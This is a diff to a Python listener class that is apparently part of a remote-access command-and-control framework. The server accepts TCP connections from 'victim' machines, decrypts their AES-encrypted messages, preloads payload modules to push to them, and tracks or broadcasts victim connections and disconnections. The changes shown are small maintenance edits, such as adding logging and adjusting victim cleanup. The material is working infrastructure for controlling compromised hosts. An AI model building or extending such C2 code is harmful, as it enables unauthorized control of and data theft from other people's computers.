@@ -2,6 +2,7 @@ import socket
 import threading
 import json
 import time
+import logging
 from datetime import datetime
 
 from lib.C2P import C2P
@@ -13,6 +14,9 @@ from lib.tool import EZData, EZClass
 from lib.EZPayload import get_payload
 
 class Listener:
+    log = logging.getLogger(__name__ + '.Listener')
+    log.setLevel(logging.NOTSET)
+
     def __init__(self, ip: str, port: int, main_listener: mainListener):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -65,6 +69,7 @@ class Listener:
 
         clnt = Client(clnt_sock)
         clnt.addr = clnt_addr
+        clnt.type = 'TCP'
 
         try:
             while clnt_sock.fileno() != -1:
@@ -177,9 +182,8 @@ class Listener:
                                     cp.pf_err('Vertification failed.', clnt.addr)
                         elif nCmd == 2: # Victim
                             try:
-                                cipher = Encoder.b64str2bytes(abMsg.decode('utf-8'))
+                                cipher = Encoder.b64str2bytes(abMsg.decode('ascii'))
                                 plain = clnt.pAES.decrypt_cbc(cipher)
-
                                 szPlain = plain.decode('utf-8')
 
                                 aMsg = szPlain.split('|')
@@ -189,7 +193,7 @@ class Listener:
 
                                     # pre load payload
                                     ls_preload = [
-                                        'EZEncoder',
+                                        'Encoder',
                                         'EZData',
                                     ]
                                     for szName in ls_preload:
@@ -232,11 +236,11 @@ class Listener:
                 self.dic_victim.pop(clnt.VictimID)
                 self.main_listener.boardcast_clnt(['disconnect', 'victim', clnt.VictimID])
 
-            del clnt
+            #del clnt
 
         except Exception as ex:
             #raise ex
-            #self.dic_victim.pop(clnt.VictimID)
+            self.dic_victim.pop(clnt.VictimID)
             print(f'Template: {ex}')
         
     def get_victims(self) -> dict:
